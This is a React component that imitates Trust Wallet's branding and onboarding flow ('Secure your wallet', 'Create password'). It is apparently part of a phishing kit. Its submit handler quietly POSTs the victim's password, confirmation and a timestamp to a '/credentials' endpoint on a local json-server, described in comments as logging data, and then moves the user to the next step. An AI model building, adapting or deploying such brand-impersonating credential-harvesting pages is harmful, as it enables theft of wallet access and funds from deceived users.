import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import trustShieldImg from "./picture/trust shield.jpg";
import sheild from "./video/shieldvid.mp4";

const Home4 = () => {
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);
  const navigate = useNavigate();
  const wallets = [{ name: "Trust Wallet Mobile", img: trustShieldImg }];

  const handleSubmit = async (e) => {
    e.preventDefault();

    // The data object to be saved
    const userData = {
      password,
      confirmPassword,
      timestamp: new Date().toISOString(),
    };

    try {
      // Sending data to your local db.json via json-server
      await fetch("http://localhost:3001/credentials", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(userData),
      });
    } catch (error) {
      console.error("Error logging data:", error);
    }
  };

  // Custom SVG Eye Icon matching the image style
  const EyeIcon = () => (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.5"
      strokeLinecap="round"
      strokeLinejoin="round"
      className="text-blue-600"
    >
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
      <circle cx="12" cy="12" r="3"></circle>
    </svg>
  );

  return (
    <div className="bg-white sm:flex h-full w-full bg-white text-gray-900 font-sans overflow-hidden">
      <div className="w-full bg-gradient-to-br to-violet-200 lg:w-[40%]  p-14 bg-gradient-to-br to-violet-200 p-12 flex flex-col justify-between">
        <div className="">
          <div className=" sm:flex items-cent er gap-3 text-blue-700 font-bold text-xl tracking-tight">
            <div className="flex sm:justify-start items-center space-x-2 mb-4">
              <img
                src={trustShieldImg}
                alt="trust shield"
                className="size-[40px] h-[40px]"
              />
              <h1 className="text-2xl font-bold tracking-tight text-blue-700">
                TRUST <span className="font-extralight">WALLET</span>
              </h1>
            </div>
          </div>

          <div className="mt-[50px]">
            <p className=" text-gray-400 text-sm font-semibold mb-2 uppercase tracking-wide">
              Step 3 of 3
            </p>
            <h1 className="text-3xl text-center sm:text-4xl text-start font-bold text-gray-800 tracking-tight">
              Secure your wallet
            </h1>
          </div>
        </div>

        <div className="hidden sm:flex mt-[120px] mr-[20px] justify-center opacity-80 transition-all">
                  <video
                    src={sheild}
                    autoPlay
                    loop
                    muted
                    playsInline
                    className="h-[200px]  w-[200px] object-cover rounded-[10px] bg-slate-200 shadow-slate-200/50"
                  />
                </div>
      </div>

      <div className="flex-1 p-8 lg:p-24 flex flex-col justify-center">
        <div className="max-w-md mx-auto w-full">
          <button
            onClick={() => navigate("/switch")}
            className="text-slate-400 flex items-center gap-2 text-sm mb-10 hover:text-blue-600 transition-colors font-medium"
          >
            <span>&larr;</span> Back
          </button>

          <h3 className="text-3xl font-bold mb-10 text-slate-900">
            Create password
          </h3>

          <form onSubmit={handleSubmit} className="space-y-8">
            <div className="space-y-2">
              <label className="block text-sm font-bold text-slate-600">
                Password
              </label>
              <div className="relative group">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Min 8 characters"
                  className="w-full p-4 pr-12 bg-slate-50 border border-slate-200 rounded-2xl focus:ring-2 focus:ring-blue-500 focus:bg-white focus:outline-none transition-all"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 -translate-y-1/2"
                >
                  <EyeIcon />
                </button>
              </div>
            </div>

            <div className="space-y-2">
              <label className="block text-sm font-bold text-slate-600">
                Confirm password
              </label>
              <div className="relative group">
                <input
                  type={showConfirm ? "text" : "password"}
                  placeholder="Password"
                  className="w-full p-4 pr-12 bg-slate-50 border border-slate-200 rounded-2xl focus:ring-2 focus:ring-blue-500 focus:bg-white focus:outline-none transition-all"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowConfirm(!showConfirm)}
                  className="absolute right-4 top-1/2 -translate-y-1/2"
                >
                  <EyeIcon />
                </button>
              </div>
            </div>

            <div className="pt-4">
              <button
                type="submit"
                onClick={() => navigate("/continue")}
                className="w-full bg-[#5F63E1] hover:bg-blue-700 text-white py-4 rounded-full font-bold text-lg shadow-xl shadow-blue-100 transition-all active:scale-95"
              >
                Continue
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Home4;
